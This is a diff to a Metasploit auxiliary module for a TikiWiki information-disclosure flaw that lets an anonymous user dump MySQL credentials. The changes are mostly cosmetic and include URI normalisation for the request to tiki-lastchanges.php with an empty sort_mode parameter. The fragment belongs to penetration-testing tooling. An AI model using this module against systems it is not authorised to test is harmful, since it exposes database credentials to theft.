@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -17,7 +13,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'TikiWiki information disclosure',
+			'Name'           => 'TikiWiki Information Disclosure',
 			'Description'    => %q{
 					A vulnerability has been reported in Tikiwiki, which can be exploited by
 				a anonymous user to dump the MySQL user & passwd just by creating a mysql
@@ -27,7 +23,6 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					['OSVDB', '30172'],
@@ -52,7 +47,8 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		print_status("Establishing a connection to the target...")
 
-		rpath = datastore['URI'] + "/tiki-lastchanges.php?days=1&offset=0&sort_mode="
+		uri = normalize_uri(datastore['URI'], '/tiki-lastchanges.php')
+		rpath = uri + "?days=1&offset=0&sort_mode="
 
 		res = send_request_raw({
 			'uri'     => rpath,
